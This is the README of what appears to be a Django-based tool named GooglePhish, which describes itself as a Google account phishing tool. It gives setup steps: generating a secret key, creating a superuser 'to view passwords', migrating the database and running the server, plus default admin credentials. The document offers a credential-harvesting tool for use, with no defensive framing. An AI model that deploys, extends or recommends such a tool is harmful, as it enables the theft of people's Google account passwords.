## GooglePhish
- Google Account Phishing Tool

## Generate and update new random key before using GooglePhish
-  Generate and copy new key
    '''bash
    python3 generate_new_key.py
    '''
- update secret key in settings.py of GooglePhish on line 23
    '''python3
    # SECURITY WARNING: keep the secret key used in production secret!
    SECRET_KEY = 'your_new_key'
    '''

## create user to view passwords

- Create user
    ```bash
    python3 manage.py createsuperuser
    ```
- migrate db
    ```bash
    python3 manage.py makemigrations
    python3 manage.py migrate
    ```
- run server
    ```bash
    python3 manage.py runserver
    ```

### Default admin details 
```
username :  admin
password : googlephish
```